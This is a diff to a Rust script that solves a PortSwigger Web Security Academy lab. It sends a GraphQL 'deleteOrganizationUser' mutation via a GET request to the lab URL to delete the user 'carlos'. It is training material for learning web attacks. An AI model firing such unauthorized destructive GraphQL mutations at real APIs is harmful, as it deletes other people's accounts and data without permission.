@@ -21,37 +21,31 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a5500c704c6ac8181eda8800050007b.web-security-academy.net";
+const LAB_URL: &str = "https://0a8a006f0367820d81cf703c0063007d.web-security-academy.net";
 
 fn main() {
     print!("❯❯ Deleting carlos.. ");
     flush_terminal();
 
-    let mutation = r###"mutation deleteOrganizationUser($input: DeleteOrganizationUserInput) {
-                                deleteOrganizationUser(input: $input){
-                                        user { 
-                                            id
-                                            username
-                                        }
+    let mutation = r###"mutation deleteOrganizationUser {
+                            deleteOrganizationUser(input: { id: 3 }) {
+                                user { 
+                                    id
+                                    username
                                 }
-                        }"###;
-    let variables = r###"{
-                            "input":{
-                                "id": 3
                             }
                         }"###;
-
-    delete_calros(mutation, variables);
+    delete_calros(mutation);
 
     println!("{}", "OK".green());
     println!("🗹 The lab should be marked now as {}", "solved".green())
 }
 
-fn delete_calros(mutation: &str, variables: &str) {
+fn delete_calros(mutation: &str) {
     let client = build_web_client();
     client
         .get(format!(
-            "{LAB_URL}/api?query={mutation}&variables={variables}"
+            "{LAB_URL}/api?query={mutation}"
         ))
         .send()
         .expect(&format!("{}", "⦗!⦘ Failed to delete carlos".red()));
